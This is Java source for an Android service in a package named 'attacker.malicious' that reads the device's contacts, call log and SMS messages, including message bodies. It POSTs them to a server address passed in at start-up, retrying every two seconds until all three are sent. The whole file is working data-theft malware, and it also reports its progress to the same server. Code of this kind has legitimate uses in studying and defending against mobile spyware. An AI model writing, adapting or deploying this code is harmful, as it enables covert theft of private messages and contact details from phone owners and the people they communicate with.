package attacker.malicious;

import android.Manifest;
import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CompleteExfilService extends IntentService {

    private String server;

    class SingleExfilService {
        private String dataName;
        private String permission;
        private String[] projection;
        private Uri uri;
        public boolean exfiltrated;
        private String server;


        public SingleExfilService(String _dataName, String _permission, String[] _projection, Uri _uri, String server_) {
            dataName = _dataName;
            permission = _permission;
            projection = _projection;
            uri = _uri;
            exfiltrated = false;
            server = server_;
        }

        private Cursor getCursor() {
            ContentResolver contentResolver = getContentResolver();
            String selection = projection[0] + " like \"%\"";
            if (contentResolver == null) {
                return null;
            }
            Cursor cur = null;
            try {
                cur = contentResolver.query(
                        uri,
                        projection,
                        selection,
                        null,
                        null
                );
                cur.moveToFirst();
            } catch (NullPointerException err) {
                err.printStackTrace();
            }
            return cur;
        }

        private boolean exfil(final Cursor cur, Context context) {
            if (context == null || cur == null) {
                return false;
            }
            RequestQueue queue = Volley.newRequestQueue(context);
            StringRequest req = new StringRequest(
                    Request.Method.POST,
                    server,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {}
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError err) {}
                    }) {
                @Override
                protected Map<String, String> getParams() {
                    HashMap<String, String> userdata = new HashMap<>();
                    for (int i = 0; i < cur.getCount(); i++) {
                        HashMap<String, String> entry = new HashMap<>();
                        for (int j = 0; j < cur.getColumnCount(); j++) {
                            String name = projection[j];
                            String value = cur.getString(j);
                            entry.put(name, value);
                        }
                        userdata.put(dataName + "-" + Integer.toString(i), entry.toString());
                        cur.moveToNext();
                    }
                    return userdata;
                }
            };
            queue.add(req);

            return true;
        }

        private void tryExfil() {
            log("compexfservice", "try exfil for " + this.dataName);
            Context context = getApplicationContext();
            if (ContextCompat.checkSelfPermission(context, permission)
                    == PackageManager.PERMISSION_DENIED
                    || ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET)
                    == PackageManager.PERMISSION_DENIED) {
                log("compexfservice", "permission denied for " + this.dataName);
                return;
            }
            Cursor cursor = getCursor();
            if(exfil(cursor, context)) {
                log("compexfservice", "exfil successful for " + this.dataName);
                exfiltrated = true;
            }
        }
    }

    public CompleteExfilService() {
        super(CompleteExfilService.class.getName());
    }

    public void _log(final String msg) {
        RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
        StringRequest req = new StringRequest(
                Request.Method.POST,
                server,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError err) {}
                }) {
            @Override
            protected Map<String, String> getParams() {
                HashMap<String, String> params = new HashMap<>();
                params.put("log", msg);
                return params;
            }
        };
        queue.add(req);
    }

    public void log(String label, String msg) {
        _log(label + ": " + msg);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        log("CompleteExfSrv", "service started");
        server = intent.getExtras().getString("server");
        List<SingleExfilService> exfilServices = Arrays.asList(
                // ContactsExfilService
                new SingleExfilService(
                        "contact",
                        Manifest.permission.READ_CONTACTS,
                        new String[]{
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY,
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                        },
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        server
                ),
                // CallLogsExfilService
                new SingleExfilService(
                        "call-log",
                        Manifest.permission.READ_CALL_LOG,
                        new String[]{
                                CallLog.Calls.NUMBER,
                                CallLog.Calls.DURATION,
                                CallLog.Calls.DATE
                        },
                        CallLog.Calls.CONTENT_URI,
                        server
                ),
                // SmsLogsExfilService
                new SingleExfilService(
                        "sms-log",
                        Manifest.permission.READ_SMS,
                        new String[]{
                                Telephony.Sms.ADDRESS,
                                Telephony.Sms.BODY,
                                Telephony.Sms.STATUS,
                                Telephony.Sms.DATE,
                        },
                        Telephony.Sms.CONTENT_URI,
                        server
                )
        );
        boolean exfiltratedAll = true;
        do {
            try {
                exfiltratedAll = true;
                for (SingleExfilService exfilService : exfilServices) {
                    if (!exfilService.exfiltrated) {
                        exfilService.tryExfil();
                        exfiltratedAll &= exfilService.exfiltrated;
                    }
                }
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        } while (!exfiltratedAll);

        this.stopSelf();
    }

    @Override
    public void onDestroy() {
        log("CompleteExfSrv", "onDestroy: service stopped");
        super.onDestroy();
    }
}
